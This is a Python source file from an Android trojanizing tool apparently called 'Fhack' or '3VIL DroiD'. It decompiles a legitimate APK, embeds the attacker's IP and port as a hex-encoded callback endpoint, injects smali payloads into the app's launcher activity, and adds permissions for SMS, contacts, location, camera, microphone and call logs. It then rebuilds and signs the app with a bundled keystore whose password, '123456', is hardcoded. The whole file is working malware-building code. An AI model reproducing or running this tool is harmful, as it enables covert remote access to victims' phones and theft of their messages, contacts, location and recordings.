try:
    import src.libs as lib
    import sys, os
    from src.Colors import TextColor
    import subprocess as subproc
    from src.libs import BS
    from time import sleep
    import re
except Exception as error:
    raise SystemExit, '\033[31m' + '%s' % error + "\033[0m"

decomOutPutPath = os.getcwd() + "/outputs/Malwares/"

define_ENDPOINTIP = ""
define_ENDPOINTPORT = ""
define_IncomPalm = ""
define_httpsCOM = ""
define_hexEndPoint = ""


def MASK():
    print TextColor.GREEN + """
                                            3VIL DroiD
                                  .                        .
         //\                       (\..                   ./)
        //\/                       \,\..  . ....... .  . /,/
       //\/\ //\                    \\1\..idsnemesisand./1/
       \\/\ \//  \                   .otectorandroidsnemedf.
          \\     /                 .,sisandprotectorandroids+.
          //    \                ..nemesisandprotectorandroidsn:.
         //      \             .emes       rotectora        emes..
         \\\  /\   \           ..isan      rotectorand      idsnem.
          \\\/\ \   \         .isisand    otectorandroi     emisiss.
              \ \  /         ,andprotd   randroosonemvid   ddprotec.
               \_\/\\         .torandrosdfffmeorewroo0otectorandroid.
                    \\        .d021409491dfsdfsoo\|s40edwrfewfdwer20,
                      10001  .snemisisandpd0v0\   /f05b0o/idsnemed:.
                        o0    .dprotecton6y50f\   /fvvdisandpdvdfd.
                         0     .23598731r\gdfre|ew|dswe23asew4232.
                          0-001 .23423rrr/\/\/\/\/\/\/\/\.qwdffr.
                                 .dsffdff\/\/\/\/\/\/\/\/\/dfsd.
    """ + TextColor.WHITE


def Decompile():
    command = ['apktool', '--version']
    # Check that apktool is install in system
    process = subproc.Popen(command, stdout=subproc.PIPE, stderr=subproc.PIPE)
    apktoolVersion, error = process.communicate()

    if "2." not in apktoolVersion:
        raise SystemExit, TextColor.RED + "[-] You do not have  << apktool >> please install it from setup.py" + \
                          TextColor.WHITE
    else:

        global define_ENDPOINTIP
        global define_ENDPOINTPORT

        define_ENDPOINTIP = raw_input(TextColor.CVIOLET + '~/Fhack/# Enter your RHOST(Your IP): ' + TextColor.WHITE)

        LHOST = re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", define_ENDPOINTIP)

        if LHOST is None:
            raise SystemExit, TextColor.RED + '[-] Please enter your ip correct'

        define_ENDPOINTPORT = int(
            raw_input(TextColor.CVIOLET + "~/Fhack/# Enter your RPORT(Your PORT): " + TextColor.WHITE))

        if define_ENDPOINTPORT > 65535:
            raise SystemExit, TextColor.RED + "We have not port bigger than 65535 ... !" + TextColor.WHITE

        apkPath = raw_input(TextColor.CVIOLET + "~/Fhack/# Enter apk(application) full path: " + TextColor.WHITE)

        if os.path.exists(apkPath):

            print TextColor.WARNING + "---------- Starting the process ----------"
            sleep(1)
            print TextColor.CYAN + "[+] Endpoint Ip set as: %s" % define_ENDPOINTIP + TextColor.WHITE
            sleep(.5)
            print TextColor.CYAN + "[+] Endpoint Port set as: %s" % define_ENDPOINTPORT + TextColor.WHITE
            sleep(.5)
            print TextColor.WARNING + "[+] Decompiling TARGET ..." + TextColor.WHITE
            print TextColor.WHITESMOKE + "[*] Please wait to complete this step"

            # Decompiling application with apk tool
            outPutApkDirectory = (apkPath.split('/')[-1]).split('.')[0]
            command = ["apktool", "d", "-f", apkPath,
                       '-o', decomOutPutPath + "CreateMalware/Android/" + outPutApkDirectory]
            process = subproc.Popen(command, stdout=subproc.PIPE, stderr=subproc.PIPE)
            result = process.communicate()[0]  # end decompiling

            if "error" in result:
                raise SystemExit, TextColor.RED + "[-] APKTool have error on decompiling: %s" % result + TextColor.WHITE
                print
            else:
                print TextColor.GREEN + "[+] APKTool Decompile was success"
                return decomOutPutPath + "CreateMalware/Android/" + outPutApkDirectory
        else:
            print TextColor.RED + "\n[-] Path does not exist\n"


def ByteReadyHttpsCOMM():
    print TextColor.WHITESMOKE + "[*] Byting in https comms" + TextColor.WHITE

    global define_httpsCOM
    define_httpsCOM = 1
    endPoint = "ZZZZhttps://" + define_ENDPOINTIP + ":" + str(define_ENDPOINTPORT) + \
               "/qFTHTkSl1FhadlllA0gBcg882wlHLDmhMn6j1_ykMcArMkXkE-KOQ3RV-W7JtI5nf7x65a3fwcw" \
               "gLEPvnCgmeb2f0m-VVEm_qAMZzFhGdNn8F46OtF_FJAP1b1AjG5x8X-GGH-rekgabzOzEMkQkgqYuUl"
    endpointLength = len(endPoint)

    global define_IncomPalm
    define_IncomPalm = hex(endpointLength)

    global define_hexEndPoint
    for val in endPoint:
        define_hexEndPoint += hex(ord(val)) + "\n\t\t"


def ByteReadyTCPCOMM():
    print TextColor.WHITESMOKE + "[+] Byting in tcp comms" + TextColor.WHITE

    endPoint = "ZZZZtcp://" + define_ENDPOINTIP + ":" + str(define_ENDPOINTPORT)
    endpointLength = len(endPoint)

    global define_IncomPalm
    global define_httpsCOM
    global define_hexEndPoint

    define_httpsCOM = 0

    define_IncomPalm = hex(endpointLength)

    for val in endPoint:
        define_hexEndPoint += hex(ord(val)) + "\n\t\t"


def ParseAndManifest(decompilePath):
    print TextColor.WHITESMOKE + "[*] Looking for android activities" + TextColor.WHITE

    file = decompilePath + "/AndroidManifest.xml"

    handler = open(file).read()

    soup = BS(handler, "html.parser")
    activities = soup.find_all('activity-alias')
    activities += soup.find_all('activity')

    listOfActivities = list()
    mainActivity = ""

    for activity in activities:
        if "LAUNCHER" in str(activity):
            if "android:targetactivity" in str(activity).lower():
                mainActivity = str(activity['android:targetactivity'])
            elif "android:name" in str(activity).lower():
                mainActivity = str(activity['android:name'])
                listOfActivities.append(mainActivity)
            else:
                print TextColor.RED + "[-] Error in indentifying target activity"
        else:
            if "android:name" in str(activity).lower():
                listOfActivities.append(str(activity['android:name']))

    counter = 0
    make_table = lib.mytable(['Count', 'Name', "Root"])
    for item in listOfActivities:
        if counter == 0:
            make_table.add_row([0, item, "yes"])
        else:
            make_table.add_row([str(counter), item, "no"])
        counter += 1

    print TextColor.CYELLOW + str(make_table) + TextColor.WHITE + "\n"

    selected = int(raw_input(TextColor.CVIOLET + '~ Fhack/# Which activity that you wanna inject code: '
                             + TextColor.WHITE))

    try:
        print TextColor.RED + "[+] Selected Activity to inject code: %s" % listOfActivities[selected] + TextColor.WHITE
        return listOfActivities[selected]
    except IndexError as error:
        raise SystemExit, "%s => Please select item in above list" % error
    except Exception as error:
        raise SystemExit, "%s" % error


def PayloadRepairing(targetActivity, targetDecompiledDir):
    print TextColor.WARNING + "[*] Present the payloads for injection" + TextColor.WHITE

    payloadsBaseDir = os.getcwd() + "/CreateMalware/android/codeinjection/payloads"

    if define_httpsCOM == 1:
        pathToPalyoad1 = payloadsBaseDir + "/HttpsActivity1.smali"
        pathToPalyoad2 = payloadsBaseDir + "/HttpsActivity.smali"
        pathToPalyoad3 = payloadsBaseDir + "/PayloadTrustManager.smali"
        contentsOfFile1 = open(pathToPalyoad1).read()
        contentsOfFile2 = open(pathToPalyoad2).read()
        contentsOfFile3 = open(pathToPalyoad3).read()

        inject = "L" + targetActivity.replace('.', '/')
        intPackagePos = inject.rfind('/')

        moo = inject[:intPackagePos]
        packageNewName = moo.replace('/', '.').replace('L', '')
        finalPackageNewName = packageNewName + ".PayloadTrustManager"

        preppedContents1 = contentsOfFile1.replace('PLACEHOLDER', inject[:intPackagePos])
        preppedContents2 = contentsOfFile2.replace('PLACEHOLDER', inject[:intPackagePos]).replace('OILYOLO',
                                                                                                  finalPackageNewName)
        preppedContents3 = contentsOfFile3.replace('PLACEHOLDER', inject[:intPackagePos])

        # inject the tcp endpoint here
        preppedContents2 = preppedContents2.replace('IP_ADDR', define_ENDPOINTIP)
        preppedContents2 = preppedContents2.replace('END_PORT', define_ENDPOINTPORT)

        targetDirectory = targetDecompiledDir + "/smali/" + targetActivity.replace('.', '/')
        targetDirectory = targetDirectory[:targetDirectory.rfind('/')]

        assist1File = open(targetDirectory + "/HttpsActivity1.smali", "w")
        assist1File.write(preppedContents1)
        assist1File.close()

        assist2File = open(targetDirectory + "/HttpsActivity.smali", "w")
        assist2File.write(preppedContents2)
        assist2File.close()

        assist3File = open(targetDirectory + "/PayloadTrustManager.smali", "w")
        assist3File.write(preppedContents3)
        assist3File.close()

        pathToFile = targetFolder + "/smali/" + targetActivity.replace('.', '/') + '.smali'
        stringContentsOfTargetActivity = ""
        stringContentsOfTargetActivity = open(pathToFile).read()
    else:
        pathToPalyoad1 = payloadsBaseDir + "/AssistActivity1.smali"
        pathToPalyoad2 = payloadsBaseDir + "/AssistActivity.smali"
        contentsOfFile1 = open(pathToPalyoad1).read()
        contentsOfFile2 = open(pathToPalyoad2).read()
        inject = "L" + targetActivity.replace('.', '/')
        intPackagePos = inject.rfind('/')
        preppedContents1 = contentsOfFile1.replace('PLACEHOLDER', inject[:intPackagePos])
        preppedContents2 = contentsOfFile2.replace('PLACEHOLDER', inject[:intPackagePos])
        # inject the tcp endpoint here
        preppedContents2 = preppedContents2.replace('FACEPALM', define_IncomPalm)
        preppedContents2 = preppedContents2.replace('BEARDEDGREATNESS', define_hexEndPoint)
        targetDirectory = targetDecompiledDir + "/smali/" + targetActivity.replace('.', '/')
        targetDirectory = targetDirectory[:targetDirectory.rfind('/')]

        assist1File = open(targetDirectory + "/AssistActivity1.smali", "w")
        assist1File.write(preppedContents1)
        assist1File.close()

        assist2File = open(targetDirectory + "/AssistActivity.smali", "w")
        assist2File.write(preppedContents2)
        assist2File.close()

        pathToFile = targetDecompiledDir + "/smali/" + targetActivity.replace('.', '/') + '.smali'
        stringContentsOfTargetActivity = ""
        stringContentsOfTargetActivity = open(pathToFile).read()

    print TextColor.GREEN + "[+] All payload file created successfully" + TextColor.WHITE


def InjectBadCodeToActivity(targetActivity, targetDecompiledDir):
    print TextColor.WARNING + "[*] Inject bad code to apk please wait !!!" + TextColor.WHITE

    checkStrings = ['create', 'method']

    pathToFile = targetDecompiledDir + "/smali/" + targetActivity.replace('.', '/') + '.smali'
    if define_httpsCOM == 1:
        stringInvokePayload = '\ninvoke-static {p0}, INJECT/HttpsActivity;->start(Landroid/content/Context;)V\n'
    else:
        stringInvokePayload = '\ninvoke-static {p0}, INJECT/AssistActivity;->doThis(Landroid/content/Context;)V\n'

    # inject evil codes in target activity
    inject = "L" + targetActivity.replace('.', '/')
    intPackagePos = inject.rfind('/')
    stringPackageToInject = inject[:intPackagePos]
    stringInvokePayload = stringInvokePayload.replace('INJECT', stringPackageToInject)
    f = open(pathToFile, 'r')
    stringDataToWriteIntoNewActivity = ""
    for line in f.readlines():
        stringDataToWriteIntoNewActivity += line
        if all(x in line.lower() for x in checkStrings):
            stringDataToWriteIntoNewActivity += stringInvokePayload
            f.close()
    newInjectFile = open(pathToFile, "w")
    newInjectFile.write(stringDataToWriteIntoNewActivity)
    newInjectFile.close()


def InjectBadPermissionsToXML(targetFolder):
    print TextColor.WARNING + "[*] Injection bad permission please wait !!!" + TextColor.WHITE

    stringCrazyPermissions = '\n<uses-permission android:name="android.permission.INTERNET" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.ACCESS_COURSE_LOCATION" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.READ_PHONE_STATE" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.SEND_SMS" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.RECEIVE_SMS"/>'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.RECORD_AUDIO" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.CALL_PHONE" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.READ_CONTACTS" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.WRITE_CONTACTS" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.RECORD_AUDIO" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.WRITE_SETTINGS" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.CAMERA" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.READ_SMS" />'
    stringCrazyPermissions += '\n<uses-permission android:name="android.permission.READ_CALL_LOG" />"'

    checkString = "<uses-permission android:name="
    pathToFile = targetFolder + "/AndroidManifest.xml"
    # inject all needed permission
    firstCheck = 0
    f = open(pathToFile, 'r')
    stringDataToWriteIntoNewActivity = ""
    for line in f.readlines():
        stringDataToWriteIntoNewActivity += line
        if checkString.lower() in line.lower():
            if firstCheck == 0:
                stringDataToWriteIntoNewActivity += stringCrazyPermissions
                firstCheck = 1
    f.close()
    with open(pathToFile, "w") as file:
        file.write(stringDataToWriteIntoNewActivity)

    print TextColor.GREEN + "[+] Injection of bad permission was successfully !!!" + TextColor.WHITE


def BuildApkAgain(targetFolder):
    print TextColor.WARNING + "[*] Building injected apk ..."
    stringNameOfAPK = targetFolder.split('/')[-1]

    pathToNewApk = raw_input(TextColor.CVIOLET + '~ Fhack/# Enter output path: ' + TextColor.WHITE)

    stringApkToolBuildCommand = ["apktool", "b", targetFolder, '-o', pathToNewApk + "/" + stringNameOfAPK + '.apk']

    payloadsBaseDir = os.getcwd() + "/CreateMalware/android/codeinjection/payloads"

    # time to execute the build command
    print TextColor.WARNING + "[*] Apktool build ..." + TextColor.WHITE
    p = subproc.Popen(stringApkToolBuildCommand, stdout=subproc.PIPE)
    print TextColor.BLUE + "[+] Build result" + TextColor.WHITE
    print TextColor.RED + "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=" + TextColor.WHITE
    print TextColor.GREEN + "[+] APK built successfully" + TextColor.WHITE
    print TextColor.RED + "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=" + TextColor.WHITE
    print TextColor.WARNING + "[*] Wait to create the apk"

    sleep(5)

    while True:
        if not os.path.exists(str(pathToNewApk) + "/" + stringNameOfAPK + '.apk'):
            sleep(1)
        else:
            break

    stringJarSignerCommand = ["jarsigner", "-verbose", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore",
                              payloadsBaseDir + "/fhackKey.keystore", "-storepass", "123456",
                              str(pathToNewApk) + "/" + stringNameOfAPK + '.apk', "alias_name"]
    print TextColor.WARNING + "[*] Wait to signeing application ..." + TextColor.WHITE
    p = subproc.Popen(stringJarSignerCommand, stdout=subproc.PIPE)
    jarsignerResult = p.communicate()[0]

    print "[+] Jarsigner result"
    print TextColor.RED + "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=" + TextColor.WHITE
    # print jarsignerResult
    print TextColor.GREEN + "[+] Apk signed successfully :)" + TextColor.WHITE
    print TextColor.RED + "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=" + TextColor.WHITE
    print '\n'


def InjectCode():
    MASK()

    global define_ENDPOINTPORT, define_ENDPOINTIP

    if not os.path.exists(decomOutPutPath):
        os.mkdir(decomOutPutPath)

    decompileDir = Decompile()  # first we decompile the target apk

    # now we must ready comms to connect apk to one of them
    try:
        if "https" in define_ENDPOINTIP:
            ByteReadyHttpsCOMM()
        else:
            ByteReadyTCPCOMM()
    except Exception as error:
        raise SystemExit, TextColor.RED + "%s" % error + TextColor.WHITE

    # now we must pase android manifest of application then inject code to it
    try:
        selectedActivity = ParseAndManifest(decompileDir)
    except Exception as error:
        raise SystemExit, TextColor.RED + 'We have error on parsing android manifest as: %s' % error + TextColor.WHITE

    # path that attacker wanna inject code
    targetSmaliPathFromLocal = decompileDir + "/smali/" + selectedActivity.replace('.', '/') + ".smali"
    targetActivity = selectedActivity

    try:
        PayloadRepairing(targetActivity, decompileDir)
    except Exception as error:
        raise SystemExit, TextColor.RED + "Have problem on Reparing the payloads: %s" % error + TextColor.WHITE

    # now time to inject bad codes to target activity

    try:
        InjectBadCodeToActivity(targetActivity, decompileDir)
    except Exception as error:
        raise SystemExit, TextColor.RED + "Have problem on bad code injection in target activity : %s" % error + TextColor.WHITE

    # for getting all access of application we must inject all permission that exist in android :)
    try:
        InjectBadPermissionsToXML(decompileDir)
    except Exception as error:
        raise SystemExit, TextColor.RED + "Have problem on bad permission injection in target activity : %s" % error + TextColor.WHITE

    try:
        BuildApkAgain(decompileDir)
    except Exception as error:
        raise SystemExit, TextColor.RED + "Have problem on build new application: %s" % error + TextColor.WHITE


if __name__ == "__main__":
    InjectCode()
